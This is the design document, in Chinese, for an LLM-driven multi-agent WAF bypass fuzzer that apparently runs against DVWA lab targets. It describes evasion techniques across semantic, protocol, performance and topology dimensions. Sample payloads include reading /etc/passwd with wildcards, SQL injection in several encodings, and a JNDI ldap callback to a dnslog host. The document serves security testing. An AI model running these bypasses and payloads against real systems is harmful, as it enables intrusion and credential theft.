# WAF-Fuzzer Multi-Agent 架构与运作流程

## 1. 项目概述

基于 LLM 的 WAF 语义引擎绕过测试工具。覆盖命令注入（CMDI）、SQL 注入（SQLi）、Log4j JNDI 注入场景。

**核心原则：**
- Manager + Solver + Observer 三层解耦多智能体架构
- Solver 四维绕过：语义层 / 协议层 / 性能层 / 拓扑层
- Observer 独立判定，不接收 payload 语义，避免确认偏误
- AI 只做推理和变异，机械劳动全部本地化、缓存化、短路化

---

## 2. 目录结构

```
waf-fuzzer/
├── main.py                          # 多智能体系统入口
├── plan.md                          # 本文档（含 14 个章节）
├── agents/                          # Agent 层
│   ├── __init__.py
│   ├── models.py                    # 数据模型（17 个 dataclass）
│   ├── manager.py                   # Manager Agent（LLM 智能调度）
│   ├── solver.py                    # Solver Agent（四维引擎路由器）
│   ├── observer.py                  # Observer Agent（独立判定）
│   └── solver_engines/              # Solver 维度引擎
│       ├── __init__.py
│       ├── base.py                  # SolverEngine 抽象基类
│       ├── semantic.py              # 语义层引擎（LLM 生成/变异 Payload）
│       ├── protocol.py              # 协议层引擎（HPP/双重编码/Method切换）
│       ├── performance.py           # 性能层引擎（Padding/并发Fail-Open）
│       └── topology.py              # 拓扑层引擎（真实源IP发现/直连）
├── core/                            # 核心工具层
│   ├── llm_engine.py                # LLM 交互（Payload 生成/变异 + 5级JSON容错）
│   ├── baseliner.py                 # 基线采集（Session预热 + LLM驱动登录）
│   ├── memory_compressor.py         # KB 管理（base_rules + learned_rules）
│   ├── crawler.py                   # 站点爬取器（BFS + 表单提取）
│   ├── waf_fingerprinter.py         # WAF 指纹识别（被动/主动/LLM分析）
│   ├── (response_extractor.py 已删除，功能归入 agents/observer.py)
│   └── requirements.txt
├── config/
│   ├── target.yaml                  # 靶场配置（LLM密钥、目标URL、OOB配置）
│   ├── target.yaml.example          # 配置模板
│   ├── base_rules.json              # 人工维护的基础规则（agent只读）
│   └── waf_signatures.json          # WAF 指纹库（6大WAF签名）
└── output/
    ├── bypass_report.txt            # 分类文本报告
    └── learned_rules.json           # Agent 学习的 WAF 规则
```

---

## 3. 数据模型（`agents/models.py`）

```
┌─────────────────────────────────────────────────────────────────────┐
│                         数据流对象                                   │
├──────────────┬───────────────────────────────────────────────────────┤
│ InjectionPoint │ url, param, method, vuln_type, body/params模板    │
│ WAFProfile     │ waf_name, vendor, confidence, bypass_tips          │
│ AttackPlan     │ dimension_priority, first_round_strategy           │
├──────────────┼───────────────────────────────────────────────────────┤
│ SolverRequest  │ target + strategy + dimension + kb_context + round │
│ RawResponse    │ payload + status_code + headers + body + elapsed   │
├──────────────┼───────────────────────────────────────────────────────┤
│ ObserverRequest│ responses + baseline_html + vuln_type + OOB config │
│                │ + round_num + dimension                            │
│ Verdict        │ payload + is_bypass + evidence + confidence +      │
│                │ reason + status_code                               │
│ ObserverResult │ verdicts[] + bypass/blocked + summary + steer      │
├──────────────┼───────────────────────────────────────────────────────┤
│ RoundDecision  │ dimension + strategy + reasoning                   │
│ RoundRecord    │ round_num + dimension + compacted_responses[] +    │
│                │ bypass/blocked counts + summary                    │
├──────────────┼───────────────────────────────────────────────────────┤
│ Memory Board   │ BlockedFact[] + BypassFact[] + dimension_stats    │
│ (事实板)       │ 只含可验证证据（状态码、WAF签名、证据片段）         │
├──────────────┼───────────────────────────────────────────────────────┤
│ Idea Board     │ MutationHypothesis[] + available_dimensions +      │
│ (猜测板)       │ current_dimension + rounds_since_switch            │
│                │ 全部标为假设，status: pending/tried/abandoned       │
├──────────────┼───────────────────────────────────────────────────────┤
│ SteerReminder  │ message + suggested_dimension + urgency + source   │
│ CompactedResponse │ payload_summary + status_code + dimension +    │
│                │ elapsed_ms + evidence_snippet + is_bypass          │
└──────────────┴───────────────────────────────────────────────────────┘
```

---

## 4. 整体流程

```
                          main.py 入口
                              │
                    ┌─────────┴─────────┐
                    ▼                   ▼
              SiteCrawler          WAFFingerprinter
              (BFS爬取)            (被动+主动+LLM)
                    │                   │
                    ▼                   ▼
             CandidateForm[]       WAFProfile
                    │                   │
                    ▼                   │
        ┌───────────────────┐           │
        │  Manager.infer_   │           │
        │  injection_types()│           │
        └────────┬──────────┘           │
                 │                      │
                 ▼                      │
          InjectionPoint[]              │
                 │                      │
                 ├──────────────────────┘
                 │
    ┌────────────┴────────────────────────────────────────┐
    │                 对每个 InjectionPoint                 │
    │                                                     │
    │  Phase 1: Manager.collect_baseline()                │
    │           → baseline_html + baseline_elapsed_ms     │
    │                                                     │
    │  Phase 2: Manager.analyze_attack_surface()          │
    │           → AttackPlan (维度优先级 + 首轮策略)       │
    │                                                     │
    │  Phase 3: Fuzzing 循环 (max_iterations 轮)          │
    │     ┌──────────────────────────────────────────┐    │
    │     │  ① Manager.decide_strategy()             │    │
    │     │     输入: Memory Board + Idea Board       │    │
    │     │           + SteerReminder (如有)          │    │
    │     │     → RoundDecision (维度 + 策略)         │    │
    │     │                                          │    │
    │     │  ② Solver.solve()                        │    │
    │     │     └→ 引擎.generate() → payload[]       │    │
    │     │     └→ 引擎.send()    → RawResponse[]    │    │
    │     │                                          │    │
    │     │  ③ Observer.evaluate()                   │    │
    │     │     → ObserverResult (verdicts[]          │    │
    │     │       + steer_reminder?)                 │    │
    │     │                                          │    │
    │     │  ④ 转发纠偏提醒                          │    │
    │     │     if steer → set_steer_reminder()      │    │
    │     │                                          │    │
    │     │  ⑤ Manager.record_round()                │    │
    │     │     → update_boards() 更新双板           │    │
    │     │     → 存储 CompactedResponse[]           │    │
    │     │                                          │    │
    │     │  ⑥ Manager.update_kb()                   │    │
    │     │     cot = strategy + outcome_summary     │    │
    │     │                                          │    │
    │     │  ⑦ Manager.should_stop() ? → break      │    │
    │     └──────────────────────────────────────────┘    │
    └────────────────────────────────────────────────────┘
                 │
                 ▼
    Manager.generate_final_report()
                 │
                 ▼
          output/bypass_report.txt
```

---

## 5. 详细流程说明

### Phase 0: 初始化

1. 加载 `config/target.yaml`（LLM 配置、Fuzzing 参数、OOB 配置、入口 URL 列表）
2. 初始化 LLM 客户端（OpenAI 兼容接口）
3. 实例化五个组件：Manager、Solver、Observer、SiteCrawler、WAFFingerprinter

### Phase 1: 注入点发现（`core/crawler.py`）

**SiteCrawler** 从入口 URL BFS 爬取，提取所有可达表单：

```
entry_url → BFS 爬取 (max 50 页)
    │
    ├─ 提取 <form>：action、method、inputs（name→label/placeholder）
    ├─ 提取 <a href> 同站链接加入队列
    └─ 提取表单周围上下文文本（≤500 字符）
```

**Manager.infer_injection_types()** 从表单推断注入类型：

```
对每个 form → 对每个 param:
  搜索文本 = url + param_name + label + page_title + context
  关键词匹配：
    CMDI: ip, host, cmd, command, ping, 域名, execute...
    SQLi: id, uid, user, search, query, 查询, 搜索...
    Log4j: url, uri, callback, jndi, api, remote...
  命中 → 构造 InjectionPoint (body/params 含 {{INJECT}} 占位符)
```

### Phase 2: WAF 指纹识别（`core/waf_fingerprinter.py`）

```
fingerprint(url)
    │
    ├─ Step 1: 正常请求，收集响应头/cookie
    │
    ├─ Step 2: 被动指纹匹配
    │   └─ 比对 waf_signatures.json 中 6 大 WAF 的 headers/cookies 特征
    │      (Cloudflare, ModSecurity, AWS WAF, Imperva, Akamai, F5 BIG-IP)
    │
    ├─ Step 3: 主动探测
    │   └─ 发送低强度 payload (' OR 1=1 --, <script>alert(1)</script>, ; id...)
    │      检查 403/406/501/429 状态码 + 拦截页特征匹配
    │
    └─ Step 4: LLM 兜底（指纹库未命中但有拦截行为时）
        └─ 将响应头+拦截页提交 LLM，推断 WAF 类型和绕过方向
```

### Phase 3: 基线采集（`core/baseliner.py`）

```
Manager.collect_baseline(point)
    │
    ├─ warmup_session(): LLM 驱动通用登录
    │   ├─ GET 目标页面 → 获取初始 Cookie
    │   ├─ LLM 分析：是否需要登录？表单字段？CSRF token？
    │   ├─ 按 LLM 指令执行登录（GET/POST 序列）
    │   └─ 失败时 LLM 分析原因并调整，最多 3 次
    │
    └─ send_clean_request(): 发送干净请求（{{INJECT}} 替换为空）
       采集 baseline_html，失败重试 3 次（间隔 5s/10s）
```

### Phase 3.5: 攻击面分析（`agents/manager.py`）

```
Manager.analyze_attack_surface(point, waf_profile)
    │
    └─ LLM 分析：
       输入：目标信息 + WAF 信息 + KB 上下文
       输出：AttackPlan {
         dimension_priority: ["semantic", "protocol", "performance", "topology"],
         first_round_strategy: "首轮策略描述",
         predicted_blocking: "预判拦截模式",
         reasoning: "分析理由"
       }
```

### Phase 4: Fuzzing 循环

#### ① Manager.decide_strategy()

```
round 0: 直接使用 AttackPlan 的 first_round_strategy
round N: LLM 根据双层状态板决策
  - 输入：Memory Board (事实) + Idea Board (猜测) + SteerReminder (纠偏)
  - Memory Board: 最近 20 条拦截事实 + 维度统计 + 绕过事实
  - Idea Board: 待验证假设 + 已尝试假设 + 可用维度
  - SteerReminder: Observer 检测到低效死磕时注入（一次性消费）
  - 连续 ≥3 轮全拦截 → 强制切换维度（排除当前维度）
  - 输出：RoundDecision {dimension, strategy, reasoning}
```

#### ② Solver.solve()

**Solver 路由器** 根据 `dimension` 分发到对应引擎：

| 维度 | 引擎 | 核心技术 |
|------|------|----------|
| `semantic` | SemanticSolver | LLM 生成/变异 Payload，编码混淆，关键字替换 |
| `protocol` | ProtocolSolver | HPP 参数污染、双重编码、Method 切换、Header 注入、Chunked 走私 |
| `performance` | PerfSolver | 超大 Padding 撑爆 WAF 缓冲区、高并发 Fail-Open、随机延迟绕速率限制 |
| `topology` | TopologySolver | LLM 分析域名拓扑、发现真实源 IP、直连源站绕过 WAF |

每个引擎实现 `SolverEngine` 接口：
```python
class SolverEngine(ABC):
    def generate(request: SolverRequest) -> list[str]:  # 生成 payload 列表
    def send(payloads: list[str], request: SolverRequest) -> list[RawResponse]:  # 并发发包
```

**SemanticSolver 发包细节：**
- `ThreadPoolExecutor` 并发（默认 5 线程）
- GET: params 中 `{{INJECT}}` 替换为 payload
- POST: body 中 `{{INJECT}}` 替换为 `quote(payload, safe='%')`（保留已编码序列）
- 状态码 403/406/501/429 → 短路拦截
- 响应体截断 ≤50000 字符

#### ③ Observer.evaluate()

**Observer 独立判定**，不接收 payload 语义，仅从响应证据判断：

```
ObserverRequest → Observer
    │
    ├─ 1. 提取 baseline 文本块（extract_text_blocks）
    │     三级回退：<pre> → <code>/<samp>/<output>/<textarea readonly>/<div class="output"> → <body>
    │
    ├─ 2. OOB 预检查（log4j/deserialization）
    │     轮询 OOB 回调服务器，检查每个 token 是否收到回调
    │
    ├─ 3. 获取 Judge（按 vuln_type 分发）
    │     cmdi → CMDIJudge（硬编码正则，零 Token）
    │     sqli → SQLiJudge（快速规则 + LLM 深度判定）
    │     log4j → Log4jJudge（JNDI 异常 + 时序检测）
    │     其他 → GenericJudge（通用回退）
    │
    ├─ 4. 逐个响应判定：
    │     状态码短路 → OOB 回调确认 → 提取+diff+过滤 → Judge 判定
    │
    └─ 5. 返回 ObserverResult {verdicts[], bypass_count, blocked_count, summary, steer_reminder}
```

**StuckDetector 旁路纠偏**（零 LLM 调用）：

```
StuckDetector（滑动窗口，默认 6 轮）
    │
    ├─ Rule 1: 维度停滞
    │   连续 4+ 轮同一维度且 0 绕过 → urgency="high"
    │   建议：切换维度
    │
    ├─ Rule 2: 状态码单调
    │   连续 4+ 轮同一主导状态码 → urgency="medium"
    │   建议：签名匹配，尝试绕过
    │
    └─ Rule 3: 绕过后退化
        窗口内有早期绕过但最近 3+ 轮全拦截 → urgency="medium"
        建议：WAF 可能自适应，切换策略
```

**CMDIJudge**（零 Token）：
- `/etc/passwd` 系统账户行匹配
- Base64 串 ≥60 字符
- `fzcr_` 创建标记
- `ls` 输出含 fz_/fuzz_/cmdi_/waf_ 文件

**SQLiJudge**（LLM 深度判定）：
- 快速规则：DB 错误信息（MySQL/PostgreSQL/Oracle/SQLite/MSSQL）
- 时序异常：≥5x 基线 → 直接判定，3-5x → 交 LLM
- LLM 独立 Prompt：**不传 payload 语义**，仅传 diff_text + status_code + elapsed_ms

**Log4jJudge**：
- JNDI 异常堆栈（javax.naming.*, ClassNotFoundException...）
- 时序检测：响应 ≥3000ms 且基线 <500ms
- OOB 回调确认（由 Observer.evaluate 统一处理）

#### ④ 转发纠偏提醒

- 若 `ObserverResult.steer_reminder` 非空，调用 `manager.set_steer_reminder()`
- 下一轮 `decide_strategy()` 会将提醒注入 LLM prompt，然后清空

#### ⑤ Manager.record_round()

- 调用 `update_boards()` 更新 Memory Board 和 Idea Board
  - 拦截 verdict → `BlockedFact`（payload[:120], status_code, waf_signature）
  - 绕过 verdict → `BypassFact`（payload[:120], evidence[:200]）
  - 更新 `dimension_stats` 计数
  - 标记已尝试维度的 pending 假设为 "tried"
- 为每个 verdict 创建 `CompactedResponse`（payload[:80], evidence[:300]）
- 构建 `RoundRecord` 使用 `compacted_responses` 而非 `verdicts`

#### ⑥ Manager.update_kb()

- 本轮 CoT 压缩 → compress_cot_analyses()
- `cot_entries` 增加执行结果摘要：`[outcome] dim=X, bypass=N, blocked=M, evidence: ...`
- 写入 learned_rules.json → consolidate_kb()
- 下一轮 Prompt 注入 base_rules + 最新 learned_rules

#### ⑦ 终止条件

- 达到 max_iterations（默认 20）
- 连续 early_stop_on_all_blocked 轮全拦截（默认 5）

### Phase 5: 报告生成

```
Manager.generate_final_report()
    │
    ├─ 按 (vuln_type, target) 分组
    ├─ 每组内按绕过技术分类（_categorize_payload 正则匹配）
    └─ 写入 output/bypass_report.txt
```

---

## 6. WAF 规则知识库

### 分层架构

```
config/base_rules.json          output/learned_rules.json
（人工维护，agent 只读）         （agent 学习，逐轮更新）
         │                               │
         └───────────┬───────────────────┘
                     │ get_kb_context() 拼接
                     ▼
              注入 LLM Prompt
```

### base_rules.json

```json
[
  {"vuln_type": "general", "rules": "通用 WAF 绕过思路..."},
  {"vuln_type": "cmdi", "rules": "WAF 拦截命令关键字和文件路径..."},
  {"vuln_type": "sqli", "rules": "..."}
]
```

### learned_rules.json

```json
[
  {
    "vuln_type": "cmdi",
    "target": "http://...",
    "rules": "WAF对cat命令关键字实施正则拦截，c?t通配符可绕过...",
    "timestamp": "2026-05-19 12:00:00"
  }
]
```

---

## 7. Token 优化策略

| 策略 | 实现位置 | 效果 |
|------|----------|------|
| 状态码短路 | Observer (所有 Judge) | 403/406/501/429 直接跳过，不读 Body |
| 基线 diff 优先 | Observer.extract_text_blocks | 先排除页面框架，残留文本极小 |
| CMDI 硬编码正则 | CMDIJudge | 零 Token 证据提取 |
| SQLi 快速规则 | SQLiJudge | DB 错误正则命中 → 零 Token 判定 |
| SQLi LLM 仅在必要时 | SQLiJudge._llm_judge | 仅无快速规则命中时调用 LLM |
| Log4j 硬编码检测 | Log4jJudge | JNDI 异常正则 + 时序检测，零 Token |
| 独立 Observer Prompt | SQLiJudge | 不传 payload 语义，减少 token 消耗 |
| 逐轮压缩整合 | memory_compressor | 多轮 CoT 合并为一条规则 |

---

## 8. LLM JSON 解析容错（`core/llm_engine.py`）

`_chat_json` 实现五级容错：

1. **正常解析**：摘取 markdown 代码块 ```json...``` → json.loads
2. **截断修复**：finish_reason=="length" → 补全未闭合 {} 和 []
3. **自动扩容重试**：max_tokens 翻倍后重新请求
4. **数组提取**：字符级状态机按括号计数提取 payloads 数组
5. **终极回退**：正则捞出所有引号包裹的长度≥5 字符串

---

## 9. 配置格式（`config/target.yaml`）

```yaml
llm:
  provider: "openai"
  api_key: "your-api-key-here"
  model: "mimo-v2.5-pro"
  base_url: "https://token-plan-cn.xiaomimimimo.com/v1"

fuzzing:
  max_iterations: 20           # 最大轮次
  batch_size: 5                # 每轮 payload 数
  concurrency: 5               # 并发线程数
  request_timeout: 15          # HTTP 超时秒数
  early_stop_on_all_blocked: 5 # 连续全拦截轮数 → 提前终止
  solver_dimensions:            # 可用维度
    - semantic
    - protocol
    - performance
    - topology
  dimension_switch_threshold: 3 # 连续全拦截 → 强制切换维度

oob:                            # Log4j OOB 回调配置
  server: "oob.example.com"
  poll_api: "https://oob.example.com/api/poll"
  api_key: ""
  poll_interval_ms: 2000
  poll_timeout_ms: 30000

entry_urls:                     # 目标入口 URL
  - "http://192.168.1.100:81/"
```

---

## 10. 输出格式（`output/bypass_report.txt`）

```
================================================================================
WAF-Fuzzer Bypass Report
生成时间: 2026-05-19  |  共 N 条记录
================================================================================

████ CMDI · http://target/vulnerabilities/exec/ ████████████████████████████████

── 绕过文件路径（通配符变形）─ 3条 ──
Payload                                              证据摘要
--------------------------------------------------  ------------------------------
;/bin/c?t /???/pass??                                root:x:0:0:root...
;nl /etc/passwd                                      1  root:x:0:0:root...

── 绕过命令（编码绕过）─ 1条 ──
Payload                                              证据摘要
--------------------------------------------------  ------------------------------
;cat /etc/passwd | base64                            cm9vdDp4OjA6MDpyb290...

████ SQLi · http://target/vulnerabilities/sqli/ ██████████████████████████████████

── UNION注入 ─ N条 ──
...
```

---

## 11. 安全约束

1. Observer 不接收 payload 语义，仅从响应证据判定，避免确认偏误
2. 所有 HTTP 请求不走系统代理（`trust_env=False`），不跟随重定向
3. AI 不硬编码 WAF 规则，全部由 agent 从拦截数据中自行总结
4. base_rules.json 永不被 agent 写入，仅人工维护
5. OOB token 每轮生成唯一值，防止跨轮干扰

---

## 12. 架构增强：双层状态板 + Observer 旁路纠偏 + 上下文压缩

### 12.1 双层状态板（Dual-Layer State Board）

将 Manager 的上下文严格解耦为两层，防止 LLM 幻觉与上下文污染：

```
Memory Board（事实板）                Idea Board（猜测板）
  只含可验证证据                        全部标为假设
  ┌───────────────────┐                ┌───────────────────┐
  │ BlockedFact[]     │                │ MutationHypothesis[]│
  │   payload_summary │                │   hypothesis       │
  │   status_code     │                │   target_dimension │
  │   waf_signature   │                │   confidence       │
  │   dimension       │                │   source           │
  │                   │                │   status: pending/ │
  │ BypassFact[]      │                │     tried/abandoned│
  │   payload_summary │                │                   │
  │   evidence_summary│                │ available_dimensions│
  │   dimension       │                │ current_dimension  │
  │                   │                │ rounds_since_switch│
  │ dimension_stats   │                │                   │
  │   {dim: {blocked, │                └─────────┬─────────┘
  │     bypass}}      │                          │
  └─────────┬─────────┘                          │
            │  to_prompt_text()                  │  to_prompt_text()
            └──────────────┬─────────────────────┘
                           ▼
                  Manager.decide_strategy()
```

**关键约束：**
- Memory Board 只存可验证事实（HTTP 状态码、WAF 签名、证据片段），不存猜测
- Idea Board 所有条目标注为"假设"，LLM prompt 中明确标注"以下均为猜测"
- 拦截 payload 使用滑动窗口（`collections.deque(maxlen=30)`），而非无限增长列表

### 12.2 Observer 旁路纠偏（Sidecar Pattern）

Observer 从被动裁判升级为主动纠偏器，通过 `StuckDetector` 检测低效死磕：

```
Observer.evaluate()
    │
    ├─ 正常判定流程（不变）
    │
    └─ 新增：StuckDetector 检测
        │
        ├─ 维护滑动窗口（默认 6 轮）
        │   记录：round_num, dimension, bypass_count, blocked_count, dominant_status_code
        │
        ├─ Rule 1: 维度停滞
        │   连续 4+ 轮同一维度且 0 绕过
        │   → urgency="high", 建议切换维度
        │
        ├─ Rule 2: 状态码单调
        │   连续 4+ 轮同一主导状态码（如全 403）
        │   → urgency="medium", 提示签名匹配
        │
        └─ Rule 3: 绕过后退化
            窗口内有早期绕过但最近 3+ 轮全拦截
            → urgency="medium", 提示 WAF 可能自适应

    若命中 → 生成 SteerReminder
        │
        ▼
Manager.set_steer_reminder()
        │
        ▼
Manager.decide_strategy() 注入纠偏提醒到 LLM prompt
```

**关键约束：**
- StuckDetector 零 LLM 调用，纯启发式
- 永远不接收 payload 语义，只看 dimension、bypass/blocked 计数、status_code
- SteerReminder 一次性消费，注入后清空

### 12.3 上下文压缩（Context Compaction）

底层引擎向上层传递的都是高度提炼的结构化事实：

```
RawResponse（原始，可能 50KB+）
    │
    ▼  Observer 判定后压缩
CompactedResponse
    ├─ payload_summary: str    # 前 80 字符
    ├─ status_code: int
    ├─ dimension: str
    ├─ elapsed_ms: int
    ├─ evidence_snippet: str   # 前 300 字符
    └─ is_bypass: bool

RoundRecord（存储 CompactedResponse[] 而非 Verdict[]）
```

**对比：**
| 维度 | 旧方案 | 新方案 |
|------|--------|--------|
| 拦截历史 | `blocked_history: list[str]` 无限增长 | `_blocked_payloads_window: deque(maxlen=30)` 滑动窗口 |
| 轮次记录 | `RoundRecord.verdicts: list[Verdict]` 含完整证据 | `RoundRecord.compacted_responses: list[CompactedResponse]` 压缩 |
| KB 更新 | 仅策略文本 | 策略 + 执行结果摘要（维度、bypass/blocked 计数、证据片段） |

### 12.4 更新后的 Fuzzing 循环数据流

```
① Manager.decide_strategy()
   输入：Memory Board (事实) + Idea Board (猜测) + SteerReminder (纠偏)
   → RoundDecision {dimension, strategy, reasoning}

② Solver.solve()
   输入：SolverRequest + blocked_payloads (最近 30 条)
   → RawResponse[]

③ Observer.evaluate()
   输入：ObserverRequest (含 round_num, dimension)
   → ObserverResult {verdicts, steer_reminder}

④ 转发纠偏提醒
   if result.steer_reminder → manager.set_steer_reminder()

⑤ Manager.record_round()
   调用 update_boards() 更新 Memory Board + Idea Board
   存储 CompactedResponse[] 到 RoundRecord

⑥ Manager.update_kb()
   cot_entries = [strategy, outcome_summary]
   outcome_summary 包含：维度、bypass/blocked 计数、证据片段

⑦ Manager.should_stop() ? → break
```

---

## 13. 双靶场对比模式

### 13.1 配置方式

`entry_urls` 列表长度决定运行模式：

```yaml
entry_urls:
  - "http://waf-protected-site/"    # 第一个 = WAF 靶场
  - "http://no-waf-site/"           # 第二个 = 无 WAF 靶场（可选）
```

- **1 个 URL** → 黑盒模式（原有行为）
- **2 个 URL** → 对比模式

### 13.2 对比模式流程

```
Step 1: 对 WAF 靶场执行完整 Fuzzing
    └─ 收集所有被拦截的 payload

Step 2: 爬取无 WAF 靶场，匹配注入点
    └─ 按 URL path + param name 匹配，或取第一个

Step 3: 重放到无 WAF 靶场
    └─ 对每条 blocked payload，Observer 判定是否成功

Step 4: 生成对比报告
```

### 13.3 分类逻辑

| WAF 靶场结果 | 无 WAF 靶场结果 | 分类 | 含义 |
|:---:|:---:|:---:|:---|
| BYPASS | — | 真实绕过 | 不需要重放，已确认 |
| BLOCKED | BYPASS | WAF 拦截有效 | payload 有效，WAF 在工作 |
| BLOCKED | BLOCKED | payload 无效 | payload 本身有问题 |

### 13.4 对比报告示例

```
========================================================================
WAF-Fuzzer 对比报告
========================================================================

WAF 靶场:    http://waf-target/
无 WAF 靶场: http://no-waf-target/
WAF: ModSecurity (置信度: 85%)

========================================================================

  真实绕过 (1 条)
  同一 payload 在无 WAF 靶场也成功，说明绕过真实有效。

  Payload                                                        状态码    证据
  -------------------------------------------------------------- ------ ------
  ' UNION SELECT 1--                                             200    MySQL syntax error

  WAF 拦截有效 (2 条)
  payload 在无 WAF 靶场也失败，说明 payload 本身无效。

  Payload                                                        状态码    证据
  -------------------------------------------------------------- ------ ------
  ' OR 1=1--                                                     403    WAF blocked
  ; cat /etc/passwd                                              0      connection refused

========================================================================
总计: 3 条 payload | 真实绕过: 1 | payload 无效: 2
========================================================================
```

---

## 14. ProtocolSolver 重构：LLM 策略 + Python 校准

### 14.1 架构

```
LLM 输出 (ProtocolMutationStrategy JSON)
    │
    ▼
PreFlightCorrector (Python 校准器)
    ├── 编码 payload（从内到外逐层叠加）
    ├── 替换 {{PAYLOAD}} 占位符
    ├── Content-Length 自动覆写
    ├── Chunked 标准分块组装
    ├── CRLF 规范化
    └── → CorrectedRequest
            │
            ▼
    _dispatch_raw (http.client 原始 bytes 发包)
```

### 14.2 LLM 输出结构

```json
{
  "mutations": [{
    "method": "POST",
    "uri_path": "/search",
    "add_headers": [{"name": "X-Forwarded-For", "value": "127.0.0.1"}],
    "remove_headers": ["Cookie"],
    "query_params": [{"name": "id", "value": "{{PAYLOAD}}"}],
    "body_template": "q={{PAYLOAD}}",
    "encoding_layers": ["url", "base64"],
    "transfer_encoding": "chunked",
    "reasoning": "双重编码绕过 WAF 解析"
  }]
}
```

### 14.3 不可变约束

`SolverRequest.immutable_payload` 字段确保 ProtocolSolver 接收的基准 payload 语义不变。LLM 只能做外部包装、编码转换或切片（HPP），不能生成新的 SQL 语句。

### 14.4 编码层

从内到外逐层叠加：`payload → encode_layers[0] → encode_layers[1] → ...`

| 编码 | 效果 |
|------|------|
| url | `%27+OR+1%3D1--` |
| double_url | `%2527%2BOR%2B1%253D1--` |
| base64 | `JyBPUiAxPTEtLQ==` |
| hex | `27204f5220313d312d2d` |
| html_entities | `&#39;&#32;OR&#32;1=1--` |
| unicode_escape | `' OR 1=1--` |
| utf16 | `' OR 1=1--` (每字符后加 \x00) |
| null_byte | `%27%00OR%001=1--` |

---

## 15. OOB 自动化：dnslog 集成

### 15.1 概述

OOB（Out-of-Band）回调用于确认 log4j、反序列化等漏洞是否真实触发。传统方式需要手动搭建 OOB 服务器，现在通过 dnslog.cn 自动获取临时域名，零配置即可使用。

### 15.2 Provider 抽象

```python
class OOBProvider(ABC):
    def get_domain() -> str    # 返回 OOB 域名（如 xxxx.dnslog.cn）
    def poll(token: str) -> bool  # 检查 token 是否收到回调
```

实现：
- **DnslogProvider** — dnslog.cn 免费服务，自动获取临时域名
- **ManualProvider** — 兼容旧的手动 `server` + `poll_api` 配置

### 15.3 数据流

```
启动 → create_oob_provider(config)
         │
         ▼
    get_domain() → "xxxx.dnslog.cn"
         │
         ▼
Fuzzing 循环（Log4j/反序列化）
    │
    ├─ 生成 UUID token
    │
    ├─ Solver context: "OOB token: {uuid} @ xxxx.dnslog.cn"
    │   Solver 生成 payload: ${{jndi:ldap://{uuid}.xxxx.dnslog.cn/xxx}}
    │
    ├─ Solver 发包
    │
    ├─ provider.poll(uuid)
    │   GET http://dnslog.cn/recevied.php (同 session)
    │   → 响应包含 uuid → True (bypass confirmed)
    │   → 响应不含 uuid → False
    │
    └─ ObserverRequest(oob_received={...})
        Observer 直接使用 oob_received，无需 HTTP poll
```

### 15.4 Observer 兼容性

`ObserverRequest.oob_received: dict[str, bool] | None`

Observer 优先检查 `oob_received`（provider 直接 poll），为空时回退到原有 HTTP poll（兼容手动配置）。

### 15.5 配置格式

```yaml
# 方式 1：dnslog.cn（免费，无需注册）
oob:
  provider: "dnslog"

# 方式 2：手动指定（兼容旧配置）
oob:
  server: "your-oob-server.com"
  poll_api: "https://your-oob-server.com/api/poll"
```

---

## 16. 注入点检测精度优化

### 16.1 问题

`_infer_single` 使用关键词匹配，SQLi 关键词包含 `user`、`login`、`account` 等宽泛词汇。DVWA brute force 页面的 `username` 参数被误判为 SQLi 注入点。

### 16.2 三层过滤机制

**Layer 1: `_is_login_form()`**
- 检测表单是否含 `password`/`passwd`/`pwd`/`pass` 字段
- 检测 URL 路径是否含 `/login`、`/signin`、`/auth`、`/register` 等
- 命中则跳过整个表单

**Layer 2: URL 路径排除**
- `_infer_single` 开头检查 URL 是否含认证相关路径
- 命中则返回 `None`（不匹配任何漏洞类型）

**Layer 3: SQLi 关键词精简**
- 移除：`user`、`login`、`account`、`name`、`email`、`username`、`用户`
- 新增：`userid`、`user_id`、`item`、`product`、`article`、`table`、`column`、`record`、`select`、`where`、`group`、`having`

### 16.3 可选：`target_paths` 精确配置

```yaml
fuzzing:
  # 留空 = 自动推断（默认）
  # 指定后只测试匹配路径
  target_paths:
    - "/vulnerabilities/sqli/"
    - "/vulnerabilities/exec/"
```

### 16.4 验证结果

DVWA 爬取后正确保留：
- `/vulnerabilities/sqli/` → `id` → sqli
- `/vulnerabilities/exec/` → `ip` → cmdi
- `/vulnerabilities/sqli_blind/` → `id` → sqli

被过滤：
- `/vulnerabilities/brute/` → `username`+`password` → `_is_login_form` 过滤
- `/login.php` → URL 路径排除

---

## 17. 按漏洞类型配置靶场 URL 对

### 17.1 问题

`entry_urls` 扁平列表不支持按漏洞类型分组。用户需要为每种漏洞类型（sqli/cmdi/log4j）分别配置 WAF 和无-WAF 靶场 URL 对。

### 17.2 新配置格式

```yaml
targets:
  sqli:
    waf: "http://host:81/vulnerabilities/sqli/"
    no_waf: "http://host:8111/vulnerabilities/sqli/"
  cmdi:
    waf: "http://host:81/vulnerabilities/cmdi/"
    no_waf: "http://host:8111/vulnerabilities/cmdi/"
  log4j: {}  # 暂不测试
```

旧 `entry_urls` 格式仍兼容。

### 17.3 直接页面定位

URL 已精确到漏洞页面，无需全站爬取。新增 `fetch_page_forms(url)` 直接获取指定页面的表单。

### 17.4 流程

```
for vuln_type in targets:
  run_vuln_type(type, waf_url, no_waf_url)
    ├─ fetch_page_forms(waf_url) → [CandidateForm]
    ├─ infer_injection_types_with_hint(forms, type) → [InjectionPoint]
    ├─ Fuzzing loop → collect blocked_payloads
    ├─ fetch_page_forms(no_waf_url)
    ├─ replay_against_target(blocked, no_waf_target)
    └─ generate_compare_report()
```

### 17.5 关键函数

| 函数 | 文件 | 作用 |
|------|------|------|
| `fetch_page_forms(url)` | main.py | 直接获取页面表单，不做全站爬取 |
| `infer_injection_types_with_hint(forms, type)` | manager.py | 使用 vuln_type 直接构建注入点，跳过关键词推断 |
| `run_vuln_type(type, waf, no_waf)` | main.py | 单漏洞类型的完整对比流程 |
